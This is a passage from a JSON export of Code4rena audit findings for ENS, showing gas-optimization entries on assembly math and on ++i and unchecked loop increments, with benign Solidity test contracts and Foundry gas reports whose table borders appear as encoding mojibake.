â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract6 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 41893              â”† 240             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ divTest            â”† 325             â”† 325 â”† 325    â”† 325 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract7 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 37287              â”† 217             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ divAssemblyTest    â”† 265             â”† 265 â”† 265    â”† 265 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n\n```\n\n### Lines\n\nFor full list of line references, see warden's [original submission](https://github.com/code-423n4/2022-07-ens-findings/issues/176).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-03-use-assembly-for-math-add-sub-mul-div",
      "tags": [],
      "finders": []
    },
    {
      "id": "5561",
      "title": "[G-02] `unchecked{++i}` instead of `i++` (or use assembly when applicable)",
      "impact": "GAS",
      "content": "\nUse `++i` instead of `i++`. This is especially useful in for loops but this optimization can be used anywhere in your code. You can also use `unchecked{++i;}` for even more gas savings but this will not check to see if `i` overflows. For extra safety if you are worried about this, you can add a require statement after the loop checking if `i` is equal to the final incremented value. For best gas savings, use inline assembly, however this limits the functionality you can achieve. For example you cant use Solidity syntax to internally call your own contract within an assembly block and external calls must be done with the `call()` or `delegatecall()` instruction. However when applicable, inline assembly will save much more gas.\n\n```js\n\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n    Contract2 c2;\n    Contract3 c3;\n    Contract4 c4;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n        c2 = new Contract2();\n        c3 = new Contract3();\n        c4 = new Contract4();\n    }\n\n    function testGas() public {\n        c0.iPlusPlus();\n        c1.plusPlusI();\n        c2.uncheckedPlusPlusI();\n        c3.safeUncheckedPlusPlusI();\n        c4.inlineAssemblyLoop();\n    }\n}\n\ncontract Contract0 {\n    //loop with i++\n    function iPlusPlus() public pure {\n        uint256 j = 0;\n        for (uint256 i; i < 10; i++) {\n            j++;\n        }\n    }\n}\n\ncontract Contract1 {\n    //loop with ++i\n    function plusPlusI() public pure {\n        uint256 j = 0;\n        for (uint256 i; i < 10; ++i) {\n            j++;\n        }\n    }\n}\n\ncontract Contract2 {\n    //loop with unchecked{++i}\n    function uncheckedPlusPlusI() public pure {\n        uint256 j = 0;\n        for (uint256 i; i < 10; ) {\n            j++;\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n}\n\ncontract Contract3 {\n    //loop with unchecked{++i} with additional overflow check\n    function safeUncheckedPlusPlusI() public pure {\n        uint256 j = 0;\n        uint256 i = 0;\n        for (i; i < 10; ) {\n            j++;\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        //check for overflow\n        assembly {\n            if lt(i, 10) {\n                mstore(0x00, \"loop overflow\")\n                revert(0x00, 0x20)\n            }\n        }\n    }\n}\n\ncontract Contract4 {\n    //loop with inline assembly\n    function inlineAssemblyLoop() public pure {\n        assembly {\n            let j := 0\n\n            for {\n                let i := 0\n            } lt(i, 10) {\n                i := add(i, 0x01)\n            } {\n                j := add(j, 0x01)\n            }\n        }\n    }\n}\n\n```\n\n### Gas Report\n\n```js\n\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract0 contract â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 37687              â”† 219             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ iPlusPlus          â”† 2039            â”† 2039 â”† 2039   â”† 2039 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract1 contract â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 37287              â”† 217             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ plusPlusI          â”† 1989            â”† 1989 â”† 1989   â”† 1989 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract3 contract     â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost        â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 42693                  â”† 244             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name          â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ safeUncheckedPlusPlusI â”† 1355            â”† 1355 â”† 1355   â”† 1355 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract2 contract â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 35887              â”† 210             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ uncheckedPlusPlusI â”† 1329            â”† 1329 â”† 1329   â”† 1329 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract4 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 26881              â”† 164             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ inlineAssemblyLoop â”† 709             â”† 709 â”† 709    â”† 709 â”† 1       